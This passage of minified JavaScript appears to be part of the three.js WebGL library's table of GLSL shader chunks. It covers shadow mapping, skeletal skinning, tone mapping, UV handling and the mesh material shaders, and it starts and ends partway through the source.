NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n#endif\\n\",\nshadowmap_vertex:\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n#endif\\n\",\nshadowmask_pars_fragment:\"float getShadowMask() {\\n\\tfloat shadow = 1.0;\\n\\t#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tshadow *= bool( directionalLight.shadow ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tshadow *= bool( spotLight.shadow ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tshadow *= bool( pointLight.shadow ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#endif\\n\\treturn shadow;\\n}\\n\",\nskinbase_vertex:\"#ifdef USE_SKINNING\\n\\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\\n\\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\\n\\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\\n\\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\\n#endif\",skinning_pars_vertex:\"#ifdef USE_SKINNING\\n\\tuniform mat4 bindMatrix;\\n\\tuniform mat4 bindMatrixInverse;\\n\\t#ifdef BONE_TEXTURE\\n\\t\\tuniform sampler2D boneTexture;\\n\\t\\tuniform int boneTextureWidth;\\n\\t\\tuniform int boneTextureHeight;\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tfloat j = i * 4.0;\\n\\t\\t\\tfloat x = mod( j, float( boneTextureWidth ) );\\n\\t\\t\\tfloat y = floor( j / float( boneTextureWidth ) );\\n\\t\\t\\tfloat dx = 1.0 / float( boneTextureWidth );\\n\\t\\t\\tfloat dy = 1.0 / float( boneTextureHeight );\\n\\t\\t\\ty = dy * ( y + 0.5 );\\n\\t\\t\\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\\n\\t\\t\\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\\n\\t\\t\\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\\n\\t\\t\\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\\n\\t\\t\\tmat4 bone = mat4( v1, v2, v3, v4 );\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#else\\n\\t\\tuniform mat4 boneMatrices[ MAX_BONES ];\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tmat4 bone = boneMatrices[ int(i) ];\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#endif\\n#endif\\n\",\nskinning_vertex:\"#ifdef USE_SKINNING\\n\\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\\n\\tvec4 skinned = vec4( 0.0 );\\n\\tskinned += boneMatX * skinVertex * skinWeight.x;\\n\\tskinned += boneMatY * skinVertex * skinWeight.y;\\n\\tskinned += boneMatZ * skinVertex * skinWeight.z;\\n\\tskinned += boneMatW * skinVertex * skinWeight.w;\\n\\tskinned  = bindMatrixInverse * skinned;\\n#endif\\n\",skinnormal_vertex:\"#ifdef USE_SKINNING\\n\\tmat4 skinMatrix = mat4( 0.0 );\\n\\tskinMatrix += skinWeight.x * boneMatX;\\n\\tskinMatrix += skinWeight.y * boneMatY;\\n\\tskinMatrix += skinWeight.z * boneMatZ;\\n\\tskinMatrix += skinWeight.w * boneMatW;\\n\\tskinMatrix  = bindMatrixInverse * skinMatrix * bindMatrix;\\n\\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\\n#endif\\n\",\nspecularmap_fragment:\"float specularStrength;\\n#ifdef USE_SPECULARMAP\\n\\tvec4 texelSpecular = texture2D( specularMap, vUv );\\n\\tspecularStrength = texelSpecular.r;\\n#else\\n\\tspecularStrength = 1.0;\\n#endif\",specularmap_pars_fragment:\"#ifdef USE_SPECULARMAP\\n\\tuniform sampler2D specularMap;\\n#endif\",tonemapping_fragment:\"#if defined( TONE_MAPPING )\\n  gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\\n#endif\\n\",tonemapping_pars_fragment:\"#define saturate(a) clamp( a, 0.0, 1.0 )\\nuniform float toneMappingExposure;\\nuniform float toneMappingWhitePoint;\\nvec3 LinearToneMapping( vec3 color ) {\\n\\treturn toneMappingExposure * color;\\n}\\nvec3 ReinhardToneMapping( vec3 color ) {\\n\\tcolor *= toneMappingExposure;\\n\\treturn saturate( color / ( vec3( 1.0 ) + color ) );\\n}\\n#define Uncharted2Helper( x ) max( ( ( x * ( 0.15 * x + 0.10 * 0.50 ) + 0.20 * 0.02 ) / ( x * ( 0.15 * x + 0.50 ) + 0.20 * 0.30 ) ) - 0.02 / 0.30, vec3( 0.0 ) )\\nvec3 Uncharted2ToneMapping( vec3 color ) {\\n\\tcolor *= toneMappingExposure;\\n\\treturn saturate( Uncharted2Helper( color ) / Uncharted2Helper( vec3( toneMappingWhitePoint ) ) );\\n}\\nvec3 OptimizedCineonToneMapping( vec3 color ) {\\n\\tcolor *= toneMappingExposure;\\n\\tcolor = max( vec3( 0.0 ), color - 0.004 );\\n\\treturn pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\\n}\\n\",\nuv_pars_fragment:\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n#endif\",uv_pars_vertex:\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n\\tuniform vec4 offsetRepeat;\\n#endif\\n\",\nuv_vertex:\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvUv = uv * offsetRepeat.zw + offsetRepeat.xy;\\n#endif\",uv2_pars_fragment:\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvarying vec2 vUv2;\\n#endif\",uv2_pars_vertex:\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tattribute vec2 uv2;\\n\\tvarying vec2 vUv2;\\n#endif\",\nuv2_vertex:\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvUv2 = uv2;\\n#endif\",worldpos_vertex:\"#if defined( USE_ENVMAP ) || defined( PHONG ) || defined( PHYSICAL ) || defined( LAMBERT ) || defined ( USE_SHADOWMAP )\\n\\t#ifdef USE_SKINNING\\n\\t\\tvec4 worldPosition = modelMatrix * skinned;\\n\\t#else\\n\\t\\tvec4 worldPosition = modelMatrix * vec4( transformed, 1.0 );\\n\\t#endif\\n#endif\\n\",cube_frag:\"uniform samplerCube tCube;\\nuniform float tFlip;\\nuniform float opacity;\\nvarying vec3 vWorldPosition;\\n#include <common>\\nvoid main() {\\n\\tgl_FragColor = textureCube( tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) );\\n\\tgl_FragColor.a *= opacity;\\n}\\n\",\ncube_vert:\"varying vec3 vWorldPosition;\\n#include <common>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n}\\n\",depth_frag:\"#if DEPTH_PACKING == 3200\\n\\tuniform float opacity;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <uv_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( 1.0 );\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tdiffuseColor.a = opacity;\\n\\t#endif\\n\\t#include <map_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <logdepthbuf_fragment>\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tgl_FragColor = vec4( vec3( gl_FragCoord.z ), opacity );\\n\\t#elif DEPTH_PACKING == 3201\\n\\t\\tgl_FragColor = packDepthToRGBA( gl_FragCoord.z );\\n\\t#endif\\n}\\n\",\ndepth_vert:\"#include <common>\\n#include <uv_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\",\ndistanceRGBA_frag:\"uniform vec3 lightPos;\\nvarying vec4 vWorldPosition;\\n#include <common>\\n#include <packing>\\n#include <clipping_planes_pars_fragment>\\nvoid main () {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = packDepthToRGBA( length( vWorldPosition.xyz - lightPos.xyz ) / 1000.0 );\\n}\\n\",distanceRGBA_vert:\"varying vec4 vWorldPosition;\\n#include <common>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvWorldPosition = worldPosition;\\n}\\n\",\nequirect_frag:\"uniform sampler2D tEquirect;\\nuniform float tFlip;\\nvarying vec3 vWorldPosition;\\n#include <common>\\nvoid main() {\\n\\tvec3 direction = normalize( vWorldPosition );\\n\\tvec2 sampleUV;\\n\\tsampleUV.y = saturate( tFlip * direction.y * -0.5 + 0.5 );\\n\\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;\\n\\tgl_FragColor = texture2D( tEquirect, sampleUV );\\n}\\n\",equirect_vert:\"varying vec3 vWorldPosition;\\n#include <common>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n}\\n\",\nlinedashed_frag:\"uniform vec3 diffuse;\\nuniform float opacity;\\nuniform float dashSize;\\nuniform float totalSize;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\\n\\t\\tdiscard;\\n\\t}\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <color_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\nlinedashed_vert:\"uniform float scale;\\nattribute float lineDistance;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\tvLineDistance = scale * lineDistance;\\n\\tvec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\\n\\tgl_Position = projectionMatrix * mvPosition;\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nmeshbasic_frag:\"uniform vec3 diffuse;\\nuniform float opacity;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\t#ifdef USE_LIGHTMAP\\n\\t\\treflectedLight.indirectDiffuse += texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n\\t#else\\n\\t\\treflectedLight.indirectDiffuse += vec3( 1.0 );\\n\\t#endif\\n\\t#include <aomap_fragment>\\n\\treflectedLight.indirectDiffuse *= diffuseColor.rgb;\\n\\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\nmeshbasic_vert:\"#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#ifdef USE_ENVMAP\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#endif\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nmeshlambert_frag:\"uniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float opacity;\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <emissivemap_fragment>\\n\\treflectedLight.indirectDiffuse = getAmbientLightIrradiance( ambientLightColor );\\n\\t#include <lightmap_fragment>\\n\\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\\n\\t#ifdef DOUBLE_SIDED\\n\\t\\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\\n\\t#else\\n\\t\\treflectedLight.directDiffuse = vLightFront;\\n\\t#endif\\n\\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\nmeshlambert_vert:\"#define LAMBERT\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <lights_lambert_vertex>\\n\\t#include <shadowmap_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nmeshphong_frag:\"#define PHONG\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform vec3 specular;\\nuniform float shininess;\\nuniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <gradientmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <lights_phong_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_phong_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\nmeshphong_vert:\"#define PHONG\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <shadowmap_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nmeshphysical_frag:\"#define PHYSICAL\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float roughness;\\nuniform float metalness;\\nuniform float opacity;\\n#ifndef STANDARD\\n\\tuniform float clearCoat;\\n\\tuniform float clearCoatRoughness;\\n#endif\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <cube_uv_reflection_fragment>\\n#include <lights_pars>\\n#include <lights_physical_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <roughnessmap_pars_fragment>\\n#include <metalnessmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <roughnessmap_fragment>\\n\\t#include <metalnessmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_physical_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\nmeshphysical_vert:\"#define PHYSICAL\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nnormal_frag:\"#define NORMAL\\nuniform float opacity;\\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <packing>\\n#include <uv_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\nvoid main() {\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\tgl_FragColor = vec4( packNormalToRGB( normal ), opacity );\\n}\\n\",\nnormal_vert:\"#define NORMAL\\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <uv_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include 